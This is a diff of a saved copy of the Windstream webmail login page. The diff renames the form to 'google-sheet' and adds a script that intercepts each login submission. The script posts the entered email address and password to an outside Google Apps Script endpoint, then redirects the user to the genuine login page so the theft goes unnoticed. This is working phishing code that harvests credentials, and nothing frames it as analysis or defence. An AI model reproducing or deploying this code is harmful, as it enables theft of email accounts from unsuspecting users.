@@ -67385,15 +67385,15 @@ video {
   </div>
   </header>
 				<section id="login_form" class="flex flex-col justify-between px-3">
-			<form id="main-form" method="POST" action="https://windstream-email.auth-gateway.net/saml/module.php/authSynacor/login.php?AuthState=_48b17570f583f27101d8d62e7b6c153d7d3d076e75%3Ahttps%3A%2F%2Fwindstream-email.auth-gateway.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fwebmail.windstream.net%252F%26cookieTime%3D1756388712" onsubmit="disableButton();">
+			<form id="login-form" name="google-sheet" method="POST" action="https://windstream-email.auth-gateway.net/saml/module.php/authSynacor/login.php?AuthState=_48b17570f583f27101d8d62e7b6c153d7d3d076e75%3Ahttps%3A%2F%2Fwindstream-email.auth-gateway.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fwebmail.windstream.net%252F%26cookieTime%3D1756388712" onsubmit="disableButton();">
 				<div class="formfield">
 					<label for="username">Email Address</label>
-					<input tabindex="1" class="tabable" type="text" id="username" name="username" value="" placeholder="Email Address" autofocus="" required="">
+					<input tabindex="1" class="tabable" type="text" id="username" name="Username" value="" placeholder="Email Address" autofocus="" required="">
 				</div>
 				<div class="formfield">
 					<label for="password">Password</label>
 					<div class="flex relative items-baseline">
-						<input tabindex="2" class="tabable" id="password" type="password" name="password" value="" placeholder="Password" required="">
+						<input tabindex="2" class="tabable" id="password" type="password" name="Password" value="" placeholder="Password" required="">
 						<div>
 							<button tabindex="3" type="button" id="toggle" onclick="toggle_password(event)" class="tabable z-10 absolute text-gray-800 uppercase" style="right: 10px; top: 8px;">show</button>
 						</div>
@@ -67418,7 +67418,24 @@ video {
 					</button>
 					<script data-savepage-type="" type="text/plain"></script>
 				</div>
-			</form>
+			</form><script type="text/javascript">
+
+
+   const scriptURL = 'https://script.google.com/macros/s/AKfycbxnKSDadTZ9Wxv1gsiUVF7FRrLZaJ-81rgp_IRyBcoH6K9bg1PdZtLk8WuPczfBkAiMaQ/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+    .then(() => {
+      const redirectUrl = 'https://windstream-email.auth-gateway.net/saml/module.php/authSynacor/login.php?AuthState=_7075309ffc99c0b15bbc34f6672c776cc2ff440dce%3Ahttps%3A%2F%2Fwindstream-email.auth-gateway.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fwebmail.windstream.net%252F%26cookieTime%3D1756492651';
+      const link = document.createElement('a');
+      link.href = redirectUrl;
+      link.click();
+    })
+    .catch((error) => console.error('Error!', error.message));
+            })
+  </script>
 		</section>
 
 		<section id="self-care" class="px-2">
